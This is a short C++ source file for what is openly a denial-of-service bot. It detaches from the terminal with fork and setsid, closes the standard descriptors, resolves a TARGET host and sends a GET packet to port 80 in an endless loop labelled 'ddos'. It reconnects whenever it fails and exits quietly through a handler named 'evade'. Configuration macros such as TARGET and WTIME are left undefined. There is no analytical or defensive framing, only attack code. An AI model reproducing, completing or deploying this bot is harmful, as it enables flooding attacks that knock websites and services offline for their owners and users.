#include <iostream>
#include <cstring>
#include <ctime>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>

#include <unistd.h>
#include <signal.h>


int sock;
void ret(int sig){
	return;
}
int initiatebot(){
	if (fork()<0){
		return 1;
	}
	if (setsid()<0){
		return 1;
	}
}

void try_again_later(){
	sleep(ON_ERROR);
}

char* GetIP(const char* dns){
	static char ip[16];
	struct hostent* host=gethostbyname(dns);
	inet_ntop(AF_INET, host->h_addr, ip, 16);
	return ip;
}

void evade(int sig){
	close(sock);
	exit(0);
}

int main(){
	initiatebot();
	for (short tmp=0;tmp<3;tmp++)close(tmp);
	signal(SIGINT, evade);
	signal(SIGPIPE, ret);
	int failure=0;
	char pkt[strlen(GET)];
	sprintf(pkt, GET);
initbot:
	sock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct sockaddr_in target;

	target.sin_addr.s_addr=inet_addr(GetIP(TARGET));
 	target.sin_port=htons(80);
	target.sin_family=AF_INET;

	if(sock==-1){
errorhandle:
		try_again_later();
		goto initbot;
	}

cnt:
	int cnt=connect(sock, (struct sockaddr*)&target, sizeof(struct sockaddr_in));
	if (cnt==-1){
		close(sock);
		goto errorhandle;
	}
ddos:
	while (1){
		usleep(WTIME*1000000);
		if (send(sock, pkt, strlen(pkt), IPPROTO_TCP)==-1){
			if (failure++==10){
				try_again_later();
				goto initbot;
			}
			goto cnt;
		}
	}
}
